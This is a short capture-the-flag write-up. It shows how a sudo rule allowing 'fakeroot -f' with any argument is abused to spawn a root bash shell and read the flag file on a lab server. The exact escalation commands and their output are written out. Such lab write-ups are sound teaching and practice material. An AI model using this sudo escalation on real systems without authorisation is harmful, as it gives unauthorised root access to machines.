# Fake News

We are provided with an user SSH login. Once on the server, we can explore a bit and we quickly find something interesting:

```
user@65fbb9aee61c7005bfc08c5e2dec9231:~$ sudo -l
Matching Defaults entries for user on 65fbb9aee61c7005bfc08c5e2dec9231:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User user may run the following commands on
        65fbb9aee61c7005bfc08c5e2dec9231:
    (ALL) NOPASSWD: /usr/bin/fakeroot -f *
```

The `sudo` command here allows us to see what commands we can run with superuser privileges. We see that the `usr/bin/fakeroot -f` command can be ran this way, with anything as the argument.

Fakeroot is a tool that makes the environment look like it has root privileges for file manipulation: this is particularly useful to create archives with files in them having root ownership, without actually having it. By looking at the manual page for this command, we see this:

```
--faked binary
    Specify an alternative binary to use as faked. 
```

*Here, `-f` is shorthand for this `--faked` option.*
The **faked** that the manual refers to can be set to anything, therefore we could try setting it as something useful like `bash`:

```
user@65fbb9aee61c7005bfc08c5e2dec9231:~$ sudo /usr/bin/fakeroot -f bash
root@65fbb9aee61c7005bfc08c5e2dec9231:/home/user# id
root@65fbb9aee61c7005bfc08c5e2dec9231:/home/user# ls
```

Here we see that there is no output at all, for any of our commands.. but if we try to escape that shell with a simple `^D`, we can access the real root shell:

```
root@65fbb9aee61c7005bfc08c5e2dec9231:/home/user# 
exit
root@65fbb9aee61c7005bfc08c5e2dec9231:/home/user# cat /root/flag.txt 
RM{Omg_Fakeroot_is_Fak3???}
```
